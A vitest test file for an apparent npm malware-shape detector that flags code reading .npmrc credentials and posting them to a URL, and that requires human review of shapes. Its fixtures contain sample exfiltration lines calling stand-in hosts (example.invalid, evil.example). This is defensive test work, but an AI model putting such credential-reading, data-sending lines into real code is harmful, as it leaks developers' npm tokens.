import { afterEach, describe, expect, it } from 'vitest';

import { NPMRC_URL_SHAPE } from '../../../src/phases/p355.js';
import * as phase from '../../../src/phases/p355.js';
import { FLAG as SCRIPT } from '../../../src/phases/p353.js';


afterEach(() => {
  delete process.env[phase.FLAG];
  delete process.env[SCRIPT];
});

const shape: phase.MalwareShape = {
  id: 'npmrc-plus-url',
  source: 'https://example.invalid/shape',
  reviewed: false,
  fp: 'A legitimate script may read npm config.',
  parts: ['read-npmrc', 'build-url'],
  fixtureUrl: 'https://example.invalid/collect',
};

describe('phase 355', () => {
  it('returns nothing when the flag is off', () => {
    expect(phase.enabled()).toBe(false);
    expect(NPMRC_URL_SHAPE.reviewed).toBe(false);
    expect(NPMRC_URL_SHAPE.fixtureUrl).toBe('https://' + 'example.invalid/collect');
    expect(NPMRC_URL_SHAPE.parts).toEqual(['read-npmrc', 'build-url']);
    expect(phase.shapeFindings("fs.readFileSync('.npmrc');\nfetch('https://example.invalid/collect');", [shape])).toEqual([]);
  });

  it('matches a url shape and rejects an automation review', () => {
    process.env[phase.FLAG] = '1';
    process.env[SCRIPT] = '1';
    const source = "fs.readFileSync('.npmrc');\nfetch('https://example.invalid/collect');";
    const hit = phase.shapeFindings(source, [shape]);
    expect(hit[0]?.severity).toBe('info');
    expect(hit[0]?.message).toContain('not a named campaign');
    expect(phase.shapeFindings("fs.readFileSync('.npmrc');", [shape])).toEqual([]);
    expect(() => phase.reviewShapeGuard({ automation: true, reviewed: true })).toThrow(/human/);
    delete process.env[SCRIPT];
  });

  it('skips a shape that fails validation and raises a reviewed match to high', () => {
    process.env[phase.FLAG] = '1';
    process.env[SCRIPT] = '1';
    const source = "fs.readFileSync('.npmrc');\nfetch('https://example.invalid/collect');";
    expect(phase.shapeFindings(source, [{ ...shape, fixtureUrl: 'https://evil.example/collect' }])).toEqual([]);
    expect(phase.shapeFindings(source, [{ ...shape, fixtureUrl: 'not a url' }])).toEqual([]);
    expect(phase.shapeFindings(source, [{ ...shape, fixtureUrl: undefined, reviewed: true, fp: '   ' }])).toEqual([]);
    expect(phase.shapeFindings(source, [{ ...shape, fixtureUrl: undefined, source: '   ' }])).toEqual([]);
    expect(phase.shapeFindings('fetch("https://example.invalid/collect");', [{ ...shape, parts: ['read-npmrc'] }])).toEqual([]);
    const reviewed = phase.shapeFindings(source, [{ ...shape, reviewed: true }]);
    expect(reviewed[0]?.severity).toBe('high');
    const npmrcOnly = phase.shapeFindings("fs.readFileSync('.npmrc');", [{ ...shape, parts: ['read-npmrc'], fixtureUrl: undefined }]);
    expect(npmrcOnly[0]?.severity).toBe('info');
    expect(phase.reviewShapeGuard({ automation: false, reviewed: true })).toBeUndefined();
    delete process.env[SCRIPT];
  });
});
